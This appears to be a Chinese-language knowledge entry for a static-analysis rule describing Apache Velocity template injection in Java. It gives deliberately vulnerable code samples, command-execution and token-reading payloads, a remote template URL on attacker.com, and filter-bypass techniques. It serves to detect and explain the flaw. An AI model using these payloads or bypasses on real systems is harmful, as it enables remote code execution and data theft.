# Java Velocity模板注入漏洞 完整描述

> 规则 ID：`other_velocity_ssti` · 类别：ssti · 关键 sink：evaluate, mergeTemplate, parse
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## Java Velocity模板注入漏洞 完整描述
Velocity是Apache基金会推出的一款基于Java的模板引擎，旨在将业务逻辑与视图展示分离，通过模板文件（.vm）结合数据上下文渲染动态内容。**Velocity模板注入漏洞（Velocity Template Injection, VTI）** 本质是攻击者通过可控输入向Velocity模板中注入恶意代码片段，模板引擎解析执行该代码时，触发未授权的代码执行、敏感信息泄露或服务器端操作，核心根源是模板渲染时未对用户输入做严格校验，将不可信数据直接拼接进模板内容或模板路径。

## 一、漏洞产生的核心原理
Velocity的执行依赖「模板上下文（Context）」和「模板解析器（VelocityEngine）」：开发者通常将用户输入作为上下文变量传入模板，或直接拼接用户输入到模板字符串中。若用户输入未被过滤，攻击者可注入Velocity语法（如`#set`、`$!{}`、`#if`）或Java代码片段，模板引擎解析时会执行这些恶意逻辑，突破上下文隔离限制，直接操作JVM内存、调用系统函数甚至执行系统命令。

### Velocity的关键执行特性（漏洞基础）
1. Velocity支持OGNL/Java反射调用：模板中可通过`$object.method()`形式调用Java对象的方法；
2. 上下文变量可被覆盖：通过`#set`语法可修改模板上下文的变量，甚至注入新的恶意对象；
3. 模板解析无默认沙箱：Velocity默认未限制Java类的访问，攻击者可调用`Runtime`、`ProcessBuilder`等危险类；
4. 模板路径可控时可加载恶意模板文件：若模板文件路径由用户输入拼接，可加载服务器上的恶意.vm文件或远程模板。

## 二、漏洞触发的核心场景分类
### 场景1：用户输入直接拼接进模板字符串（最常见）
开发者为实现动态内容渲染，将用户输入直接拼接成Velocity模板字符串，再交由引擎渲染，攻击者可注入Velocity语法执行恶意逻辑。

#### 示例代码（漏洞代码）：
```java
// 初始化Velocity引擎
VelocityEngine ve = new VelocityEngine();
ve.init();
VelocityContext context = new VelocityContext();

// 接收用户可控输入（如HTTP参数、表单数据）
String userInput = request.getParameter("content");

// 直接拼接用户输入到模板字符串中（核心漏洞点）
String template = "欢迎访问：" + userInput;

// 渲染模板
StringWriter sw = new StringWriter();
ve.evaluate(context, sw, "testTemplate", template);
response.getWriter().write(sw.toString());
```

#### 攻击利用方式：
攻击者构造`userInput`参数为以下恶意值，触发不同危害：
- **敏感信息泄露**：`$!{request.getSession().getAttribute("userToken")}` 或 `$!{System.getProperty("user.dir")}`，读取会话令牌、服务器目录；
- **Java反射调用方法**：`$!{Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("whoami")}`，尝试执行系统命令；
- **覆盖上下文变量**：`#set($admin = true) $!{admin}`，篡改业务逻辑中的权限变量；
- **遍历JVM对象**：`$!{context.keys()}` 或 `$!{request.getHeaderNames()}`，枚举服务器上下文的敏感变量。

### 场景2：用户输入作为上下文变量名/值注入
开发者将用户输入作为上下文变量的「名称」或「值」传入模板，攻击者可通过构造特殊变量名/值，突破变量隔离，调用危险方法。

#### 子场景2.1：变量值可控（基础型）
##### 漏洞代码：
```java
VelocityContext context = new VelocityContext();
// 用户输入作为变量值传入上下文
String userName = request.getParameter("username");
context.put("name", userName); // 可控值

// 模板文件（template.vm）内容：Hello $name!
Template template = ve.getTemplate("template.vm");
StringWriter sw = new StringWriter();
template.merge(context, sw);
```
##### 攻击利用：
传入`username=$!{Runtime.getRuntime().exec("ls /")}`，若模板中直接渲染`$name`，则会尝试执行命令（部分环境需绕过反射限制）。

#### 子场景2.2：变量名可控（进阶型）
##### 漏洞代码：
```java
String varName = request.getParameter("var"); // 可控变量名
String varValue = request.getParameter("val");
VelocityContext context = new VelocityContext();
context.put(varName, varValue); // 变量名由用户控制

// 模板内容：$varName（或动态渲染变量名）
String template = "$" + varName;
ve.evaluate(context, sw, "test", template);
```
##### 攻击利用：
攻击者构造`var=runtime&val=$!{Runtime.getRuntime()}`，模板渲染`$runtime`时会获取`Runtime`对象，进一步调用`exec`方法。

### 场景3：模板文件路径/名称可控
开发者允许用户输入指定模板文件的路径或名称（如`/templates/${userInput}.vm`），攻击者可通过路径遍历或注入恶意模板路径，加载并执行恶意模板。

#### 示例代码（漏洞代码）：
```java
String templateName = request.getParameter("tpl"); // 可控模板名
// 拼接模板路径，无过滤
String templatePath = "/WEB-INF/templates/" + templateName + ".vm";
Template template = ve.getTemplate(templatePath); // 加载模板
template.merge(context, sw);
```

#### 攻击利用方式：
1. **路径遍历加载恶意模板**：传入`tpl=../../../../tmp/malicious`，加载服务器上预存的恶意.vm文件（内容含命令执行代码）；
2. **远程模板加载（若引擎配置不当）**：若Velocity开启了远程模板加载（如`resource.loader=url`），攻击者传入`tpl=http://attacker.com/malicious.vm`，加载远程恶意模板；
3. **模板名注入语法**：传入`tpl=normal#set($r=Runtime.getRuntime())`，拼接后的路径为`/WEB-INF/templates/normal#set($r=Runtime.getRuntime()).vm`，部分解析器会将`#`后的内容当作模板语法执行。

### 场景4：Velocity配置不当放大漏洞危害
即使输入有基础过滤，若Velocity引擎的配置参数未做安全限制，会大幅降低攻击难度，常见危险配置包括：
1. **允许调用危险类/方法**：未配置`velocity.properties`中的`directive.foreach.iterator.check`、`runtime.references.strict`等限制，允许模板调用`java.lang.Runtime`、`java.lang.ProcessBuilder`等类；
2. **开启模板缓存但未校验内容**：缓存恶意模板后，后续请求会重复执行恶意代码；
3. **上下文暴露全局对象**：开发者将`request`、`response`、`session`、`application`等Servlet全局对象直接传入上下文（如`context.put("request", request)`），攻击者可通过`$request.getServletContext().getRealPath("/")`读取服务器文件，或通过`$response.getWriter().write(敏感数据)`泄露信息；
4. **关闭语法校验**：配置`parser.validator=false`，允许模板中包含非法/恶意语法，绕过基础解析校验。

### 场景5：间接模板注入（嵌套/多阶段渲染）
开发者先将用户输入渲染为中间模板，再将中间结果作为新模板二次渲染，即使单次渲染无漏洞，二次渲染会触发注入。

#### 示例代码（漏洞代码）：
```java
// 第一次渲染：将用户输入作为"内容"渲染
String userInput = request.getParameter("content");
String tempTemplate = "Content: " + userInput;
StringWriter tempSw = new StringWriter();
ve.evaluate(context, tempSw, "temp", tempTemplate);
String intermediate = tempSw.toString();

// 第二次渲染：将第一次的结果作为新模板渲染（核心漏洞）
StringWriter finalSw = new StringWriter();
ve.evaluate(context, finalSw, "final", intermediate);
response.getWriter().write(finalSw.toString());
```

#### 攻击利用：
第一次渲染时传入`content=#set($r=Runtime.getRuntime().exec("id"))`，第一次渲染仅将该字符串作为普通文本输出，第二次渲染时会解析`#set`语法，执行命令。

## 三、不同Velocity版本的漏洞差异
1. **Velocity 1.x（主流旧版本）**：
   - 默认无沙箱限制，直接支持`$object.method()`调用Java方法，攻击成本低；
   - 对模板语法的校验宽松，`#`、`$`等符号无默认转义，注入后直接执行。

2. **Velocity 2.x（新版）**：
   - 新增「严格模式」（`runtime.references.strict=true`），默认禁止调用未定义的方法/类；
   - 对反射调用做了基础限制，但仍可通过上下文已存在的对象（如`request`）进行攻击；
   - 若未开启严格模式，漏洞危害与1.x一致，仅攻击语法需微调（如`$!{}`改为`$`）。

## 四、漏洞触发的前置条件
1. 开发者将**不可信用户输入**传入Velocity模板的渲染流程（拼接模板字符串、上下文变量、模板路径）；
2. 未对用户输入中的Velocity特殊字符（`$`、`#`、`{}`、`()`）进行转义；
3. Velocity引擎未配置安全限制（如禁用危险类、开启严格模式、限制模板加载路径）；
4. 渲染后的模板内容被Velocity引擎解析执行（而非仅作为纯文本输出）。

## 五、漏洞的典型危害
1. **远程代码执行（RCE）**：执行系统命令（如`whoami`、`rm -rf /`），控制服务器；
2. **敏感信息泄露**：读取服务器配置文件（`/etc/passwd`、`WEB-INF/web.xml`）、会话令牌、数据库凭证；
3. **业务逻辑篡改**：修改上下文变量（如`isAdmin=true`），越权操作；
4. **服务器资源耗尽**：注入无限循环语法（`#foreach($i in [1..1000000]) $i #end`），导致CPU/内存耗尽；
5. **跨站脚本（XSS）**：若模板渲染结果直接输出到前端，注入`<script>`标签（虽非Velocity特有，但可叠加危害）。

## 六、典型绕过方式（攻击侧）
即使开发者做了基础过滤，攻击者可通过以下方式绕过：
1. **字符编码绕过**：用Unicode编码（如`\u0024`代替`$`）、HTML实体（`&#36;`）绕过输入过滤；
2. **语法变形**：用`$!{}`代替`${}`，`#set($a=Runtime.getRuntime()) $a.exec()`拆分注入语句；
3. **反射绕过限制**：通过`Class.forName("java.lang.Runtime")`代替直接调用`Runtime`类；
4. **上下文对象复用**：调用已传入上下文的对象（如`$request.getServletContext().getAttribute("dbConfig")`），避免直接调用危险类；
5. **多阶段注入**：将恶意代码拆分为多个输入参数，拼接后触发执行（如`param1=#set($r=`, `param2=Runtime.getRuntime())`）。


